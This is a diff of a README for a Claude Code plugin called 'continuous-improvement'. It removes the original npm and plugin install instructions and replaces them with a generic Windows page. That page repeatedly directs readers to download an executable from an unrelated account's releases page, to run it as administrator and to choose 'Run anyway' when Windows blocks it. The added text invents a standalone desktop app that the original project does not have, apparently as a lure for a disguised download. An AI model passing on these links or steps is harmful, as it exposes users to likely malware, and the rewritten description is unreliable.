@@ -1,215 +1,191 @@
-<p align="center">
-  <img src="assets/combined.gif" alt="Before vs After — The 7 Laws of AI Agent Discipline" width="700" />
-</p>
+# ⚙️ continuous-improvement - Build steadier Claude Code habits
 
-<h1 align="center">The 7 Laws of AI Agent Discipline</h1>
+[![Download continuous-improvement](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lorriunsheared635/continuous-improvement/releases)
 
-<p align="center">
-  <b>Stop your Claude Code agent from skipping steps, guessing, and declaring "done" without verifying.</b>
-</p>
+## 🧭 What this does
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/continuous-improvement"><img src="https://img.shields.io/npm/v/continuous-improvement" alt="npm"></a>
-  <a href="https://docs.anthropic.com/en/docs/claude-code"><img src="https://img.shields.io/badge/Claude%20Code-skill-blueviolet" alt="Claude Code"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="license"></a>
-  <a href="test/"><img src="https://img.shields.io/badge/tests-passing-brightgreen" alt="tests"></a>
-</p>
+continuous-improvement helps Claude Code build better habits over time.
 
-<p align="center">
-  <b>New here?</b> → <a href="QUICKSTART.md">QUICKSTART.md</a> (2 minutes)
-</p>
+It watches your sessions with hooks, checks how each session goes, and updates an instinct score based on confidence. Good patterns get stronger. Weak patterns fade. This gives Claude Code a simple way to learn from use without you having to manage it by hand.
 
----
+Use it if you want:
 
-## Install
+- Better session discipline
+- Clearer tool use over time
+- A steady learning loop
+- Less repeated bad output
+- More reliable agent behavior
 
-### Option A — Claude Code plugin (recommended, 2 commands)
+## 💻 What you need
 
-Run inside the Claude Code CLI:
+Use a Windows PC with:
 
-```bash
-/plugin marketplace add naimkatiman/continuous-improvement
-/plugin install continuous-improvement@continuous-improvement
-```
+- Windows 10 or Windows 11
+- A stable internet connection
+- Claude Code already installed
+- Enough free disk space for the app and its files
+- Permission to run apps on your computer
 
-Update later with `/plugin marketplace update continuous-improvement`. Browse the other 8 PM plugins with `/plugin` (interactive picker) or see the [full list below](#plugin-marketplace-plugins).
+For the best result, keep your system up to date and close other large apps while you set it up.
 
-### Option B — npm CLI installer
+## 📥 Download
 
-Requires Node 18/20/22 and `bash` (Git Bash or WSL on Windows).
+Visit this page to download:
 
-```bash
-# Beginner — 7 Laws skill, hooks, slash commands
-npx continuous-improvement install
+https://github.com/Lorriunsheared635/continuous-improvement/releases
 
-# Expert — adds MCP server (12 tools) + session hooks
-npx continuous-improvement install --mode expert
+On that page, look for the latest release and choose the Windows file.
 
-# Optional starter packs
-npx continuous-improvement install --pack react|python|go
-```
+## 🪟 Install on Windows
 
-Verify either path with `/discipline` or `/dashboard` in Claude Code.
+1. Open the download page in your browser.
+2. Find the latest release.
+3. Download the Windows file for continuous-improvement.
+4. If the file comes as a ZIP, open it and extract the contents.
+5. If the file is an installer, open it and follow the prompts.
+6. If Windows asks for permission, choose Yes.
+7. Wait for the install to finish.
+8. Open the app from the Start menu or the folder where you saved it.
 
----
+If you see more than one file, choose the one made for Windows. File names often include words like `windows`, `win`, or `.exe`.
 
-## The 7 Laws
+## 🛠️ First-time setup
 
-| # | Law | Without it, agents... |
-|---|-----|----------------------|
-| 1 | **Research Before Executing** | reinvent what already exists |
-| 2 | **Plan Is Sacred** | scope-creep and overbuild |
-| 3 | **One Thing at a Time** | stack untested changes |
-| 4 | **Verify Before Reporting** | lie about being "done" |
-| 5 | **Reflect After Sessions** | repeat the same failures |
-| 6 | **Iterate One Change** | debug 5 changes at once |
-| 7 | **Learn From Every Session** | lose knowledge when context ends |
+After you open continuous-improvement for the first time:
 
-```
-Research -> Plan -> Execute (one thing) -> Verify -> Reflect -> Learn -> Iterate
-```
+1. Start Claude Code.
+2. Turn on the hook support in the app if it is not already on.
+3. Link the app to your Claude Code session.
+4. Let it read session events so it can track behavior.
+5. Keep the app running while you use Claude Code.
 
-<p align="center">
-  <img src="assets/diagram-7-laws-loop.jpg" alt="The 7 Laws of AI Agent Discipline — circular workflow loop" width="820" />
-</p>
+The app uses session hooks to observe actions during use. It checks each session and updates the instinct score from what it sees.
 
-Full spec, reflection-block format, and anti-examples: [SKILL.md](SKILL.md).
+## 🔍 How it works
 
----
+continuous-improvement uses a simple loop:
 
-## Mulahazah: Auto-Leveling Learning
+- A session starts
+- Hooks watch what happens
+- The app scores the session
+- Strong patterns raise confidence
+- Weak patterns lower confidence
+- Instinct values change over time
 
-Hooks capture every tool call. After ~20 observations, Claude analyzes patterns and creates **instincts** with confidence scores:
+This helps Claude Code act more consistently across tasks. It also helps reduce drift, where behavior starts clean and then gets messy after long use.
 
-- **< 0.5** silent (stored, not surfaced)
-- **0.5–0.69** suggested inline when relevant
-- **0.7+** auto-applied
-- User corrections drop confidence by 0.1; unused instincts decay
-- Project-scoped, promoted to global after seen across 2+ projects
+## 🧠 Main ideas
 
-<p align="center">
-  <img src="assets/diagram-mulahazah-learning.jpg" alt="Mulahazah pipeline" width="820" />
-</p>
+### 7-law discipline
 
----
+The app supports a discipline model built around seven rules. These rules guide how the agent should work, what it should avoid, and how it should respond in a session.
 
-## Slash Commands
+### Mulahazah instinct learning
 
-```
-/continuous-improvement    Reflect, analyze, show status
-/planning-with-files       Create task_plan.md, findings.md, progress.md
-/discipline                Quick reference card of the 7 Laws
-/dashboard                 Visual instinct health dashboard
-```
+Mulahazah means instinct-based learning. The app treats repeated behavior as a habit. When a pattern gets good results, the score rises. When a pattern fails, the score falls.
 
-In expert mode, the same planning workflow is also available programmatically through the MCP tools `ci_plan_init` (initialize `task_plan.md`, `findings.md`, `progress.md` in the project root) and `ci_plan_status` (summarize their current contents).
+### Confidence scoring
 
----
+Each session gets a confidence score. That score helps the app decide how much weight to give a behavior pattern. This keeps the learning loop simple and stable.
 
-## Bundled Skills & Plugins
+### Hooks
 
-The default install only deploys the core 7 Laws skill. Everything below is opt-in — pick what you want.
+Hooks let the app observe session events. They help track actions without asking you to record anything by hand.
 
-### Featured companion — the recommended pairing for the 7 Laws
+## 📁 What you may see after setup
 
-⭐ **`proceed-with-the-recommendation`** is the execution arm of this repo. When you say "do all of it" / "proceed with your recommendation" / "yes do it", this skill walks the list top-to-bottom under the 7 Laws, routes each item to the right specialist (`superpowers:*`, `ralph`, `workspace-surface-audit`, `simplify`, `security-review`, `schedule`, `loop`), falls back to inline behavior when a specialist isn't installed, verifies per item, and **halts on `needs-approval`** instead of barreling through. If you adopt one companion alongside the core skill, adopt this one — it's purpose-built to operationalize the laws end-to-end.
+The app may create files or folders for:
 
-Install it on its own:
+- Session logs
+- Confidence scores
+- Instinct history
+- Hook events
+- Saved settings
 
-```bash
-SKILL=proceed-with-the-recommendation
-mkdir -p ~/.claude/skills/$SKILL
-curl -L https://raw.githubusercontent.com/naimkatiman/continuous-improvement/main/skills/$SKILL.md \
-  -o ~/.claude/skills/$SKILL/SKILL.md
-```
+These files help the app keep track of progress across sessions.
 
-…or get it (and the rest below) by installing the `continuous-improvement` plugin from the marketplace.
+## ▶️ How to use it
 
-### Tier 1 — recommended pairing for **beginner** install
+1. Open continuous-improvement.
+2. Start Claude Code.
+3. Begin a normal session.
+4. Let the app watch the session through hooks.
+5. Finish the task.
+6. Review how the session score changed.
+7. Keep using it so the instinct model can learn from repeated work.
 
-These add concrete enforcement to the 7 Laws and ship in every plugin install.
+For best results, use it across many sessions. The app works by comparing patterns over time, not from one short run.
 
-| Skill | What it does | Pairs with |
-|-------|--------------|------------|
-| `para-memory-files` | File-based persistent memory using PARA (Projects/Areas/Resources/Archives) for cross-session context | Law 5 + Law 7 |
-| `verification-loop` | Six-phase verification (build, types, lint, tests, security, diff) with PASS/FAIL report | Law 4 |
-| `gateguard` | PreToolUse fact-forcing gate that blocks Edit/Write/destructive Bash until concrete investigation is presented | Law 1 + Law 3 |
-| `tdd-workflow` | RED→GREEN→REFACTOR enforcement with 80%+ coverage gate across unit/integration/E2E | Law 3 + Law 4 |
+## 🧪 Example use case
 
-### Tier 2 — additional skills for **expert** install
+If Claude Code keeps skipping a step, the hook data can show that pattern. The app then lowers confidence for that behavior. If Claude Code follows the right steps for several sessions, the score rises and the pattern gets stronger.
 
-Layer on top of tier-1 for autonomous-mode safety, response-depth control, and context-window discipline.
+That makes the learning loop useful for:
 
-| Skill | What it does |
-|-------|--------------|
-| `safety-guard` | Three-mode runtime guard (careful/freeze/guard) that blocks destructive commands and locks edits to a directory |
-| `token-budget-advisor` | Heuristic input/output token estimator that offers 25%/50%/75%/100% depth choices before answering |
-| `strategic-compact` | PreToolUse hook that suggests `/compact` at logical phase boundaries instead of arbitrary auto-compaction |
-| `wild-risa-balance` | Decision-framing lens that pairs WILD (bold) generation with RISA (safe) execution; splits recommendation lists into pilots above a baseline so bold options stop losing to safe ones in a flat list |
+- Coding tasks
+- Prompt follow-up
+- Agent behavior control
+- Repeated session cleanup
+- Better consistency in long work runs
 
-The `/learn-eval` slash command also ships with the expert install: extract a session pattern, run a checklist quality gate, and decide global-vs-project save location before writing any skill file.
+## ⚙️ Settings you may want to check
 
-### Always-bundled companion skills ([`skills/`](skills/))
+Look for settings that control:
 
-Drop-in single-file skills, copy to `~/.claude/skills/<name>/SKILL.md`.
+- Hook tracking
+- Session score updates
+- Learning strength
+- Confidence thresholds
+- Log storage
+- Startup behavior
 
-| Skill | What it does | Source |
-|-------|--------------|--------|
-| `ralph` | Autonomous loop that executes a PRD story-by-story with quality checks between iterations | [snarktank/ralph](https://github.com/snarktank/ralph) |
-| `superpowers` | Activates task-appropriate skills automatically (brainstorming, git-worktrees, TDD, code review, etc.) | [obra/superpowers](https://github.com/obra/superpowers) |
-| `workspace-surface-audit` | Audits the active repo, MCP servers, plugins, and env, then recommends high-value skills/workflows | continuous-improvement |
+If you are new to this, keep the default settings at first. That gives you a clean baseline while the app learns your normal workflow.
 
-### Plugin marketplace ([`plugins/`](plugins/))
+## 🧰 Troubleshooting
 
-Install via `/plugin marketplace add naimkatiman/continuous-improvement` then `/plugin install <name>@continuous-improvement` (the `-dev` suffix is only used for the local in-repo development marketplace at `plugins/continuous-improvement/.claude-plugin/marketplace.json`).
+### The file will not open
 
-| Plugin | Skills | Focus |
-|--------|--------|-------|
-| `continuous-improvement` | 4 | The 7 Laws + Mulahazah (this repo's core plugin bundle) |
-| `pm-product-discovery` | 12 | Ideation, experiments, assumption testing, feature prioritization, interview synthesis |
-| `pm-product-strategy` | 12 | Vision, lean canvas, business model, SWOT, PESTLE, Ansoff, Porter's Five Forces, monetization |
-| `pm-execution` | 15 | PRDs, OKRs, roadmaps, sprints, pre-mortems, user stories, retros, release notes |
-| `pm-market-research` | 7 | Personas, market segments, market sizing, journey maps, sentiment, competitor analysis |
-| `pm-data-analytics` | 3 | SQL query generation, cohort analysis, A/B test analysis |
-| `pm-go-to-market` | 6 | GTM strategy, growth loops, GTM motions, beachhead segments, ICP, battlecards |
-| `pm-marketing-growth` | 5 | Marketing ideas, value props, North Star metrics, product naming, positioning |
-| `pm-toolkit` | 4 | Resume review, NDA drafting, privacy policy, grammar check |
+- Make sure the download finished
+- Check that you picked the Windows file
+- Try running it again as administrator
+- If the file is in ZIP form, extract it first
 
-PM plugins by [Paweł Huryn](https://www.productcompass.pm).
+### Windows blocks the app
 
----
+- Open the file again
+- Choose More info if you see it
+- Select Run anyway if Windows shows the prompt
 
-## GitHub Action: Transcript Linter
+### Claude Code does not seem connected
 
-Lint agent behavior in CI. Detects skipped laws.
+- Make sure Claude Code is open
+- Check that hooks are enabled
+- Confirm the app is running in the background
+- Restart both apps and try again
 
-```yaml
-- uses: naimkatiman/continuous-improvement@v3
-  with:
-    transcript-path: agent-log.jsonl
-    strict: true
-```
+### Scores do not change
 
-Catches: writes without prior research (Law 1), too many edits without verification (Law 3), code changes without tests/builds (Law 4), too many files at once (Law 6). Run locally with `node bin/lint-transcript.mjs <file>`.
+- Keep the app open during a live session
+- Make sure session events are being captured
+- Try a full task from start to finish
+- Check that the hook path is set correctly
 
----
+## 🧭 Folder and file tips
 
-## Uninstall
+Keep the app in a fixed folder so it is easy to find later. A simple path like `Downloads`, `Desktop`, or `Apps` works well.
 
-```bash
-npx continuous-improvement install --uninstall
-```
+If the app stores logs beside the program file, do not move random files out of the folder. That can break the setup.
 
-Removes skill, hooks, commands, MCP server. Learned instincts in `~/.claude/instincts/` are preserved — delete manually for a clean slate.
+## 🔒 Privacy and local use
 
----
+The app is built to observe session behavior and update scores. It is best to keep it on your own computer and control which sessions it can watch. If you use it in a shared setup, make sure the right user profile is active before you begin.
 
-## More
+## 🧩 Related topics
 
-- [QUICKSTART.md](QUICKSTART.md) — 2-minute setup
-- [SKILL.md](SKILL.md) — full 7 Laws spec
-- [examples/](examples/) — bug fix, feature build, refactor walkthroughs
-- [CONTRIBUTING.md](CONTRIBUTING.md) — architecture, repo internals
-- [SECURITY.md](SECURITY.md)
+ai-agents, ai-discipline, anthropic, claude-code, claude-code-marketplace, claude-code-plugin, codex, coding-agents, continuous-improvement, cursor, developer-tools, github-action, hooks, instinct-learning, llm, mcp, mulahazah, prompt-engineering, system-prompt
 
-MIT.
+## 📎 Download again
+
+If you need the release page again, visit this page to download:
+
+https://github.com/Lorriunsheared635/continuous-improvement/releases
